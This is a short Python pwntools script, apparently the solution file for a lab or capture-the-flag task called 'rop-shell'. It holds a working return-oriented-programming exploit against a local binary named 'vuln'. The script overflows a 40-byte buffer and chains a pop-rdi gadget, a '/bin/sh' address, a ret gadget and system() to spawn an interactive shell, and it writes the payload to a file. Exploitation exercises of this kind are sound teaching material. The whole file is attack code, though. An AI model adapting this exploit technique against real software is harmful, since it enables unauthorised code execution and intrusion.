#!/usr/bin/env python

"""
Solution (exploit) for rop-shell task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

io = process("vuln")
elf = ELF("./vuln")


libc_base = 0x00007ffff7c00000 # From ldd vuln 

# TODO: Fill required addresses.
offset = 40
# Gadgets
pop_rdi_ret_address = p64(0x0000000000400713) # ROPgadget --binary vuln | grep rdi
ret_gadget = p64(0x0000000000400506) # ROPgadget --binary vuln | grep ret

system_address = p64(elf.plt.system) # System from plt
sh_address = p64(libc_base + 0x1d8698) # sh_address
# TODO: Craft payload.
payload = 40 * b'A'  + pop_rdi_ret_address + sh_address + ret_gadget  + system_address

open("payload", "wb").write(payload)

msg = io.recvuntil(': ')
print(msg.decode()) 
io.sendline(payload)
print(payload)
io.interactive()
